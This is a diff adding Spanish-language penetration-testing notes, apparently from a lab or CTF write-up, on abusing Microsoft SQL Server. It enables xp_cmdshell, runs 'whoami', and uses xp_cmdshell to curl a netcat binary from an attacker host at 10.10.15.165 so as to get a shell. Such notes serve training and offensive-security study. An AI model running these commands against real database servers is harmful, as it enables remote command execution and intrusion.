@@ -245,5 +245,21 @@ RECONFIGURE
 
 Para que se apliquen los cambios y poder habilitar `xp_cmdshell`
 ```shell
-
+SP_CONFIGURE "xp_cmdshell", 1
 ```
+
+Y volver a habilitar los cambios
+```shell
+RECONFIGURE
+```
+
+Pudiendo ahora ejecutar comandos 
+```shell
+xp_cmdshell "whoami"
+```
+
+Para poder ganar acceso mediante shell nos obtendremos en el servidor de MSSQL un [[NETCAT]] el cual subiremos con un curl
+```shell
+xp_cmdshell "curl 10.10.15.165:8080/nc.exe -o C:\Temp\netcat.exe"
+```
+
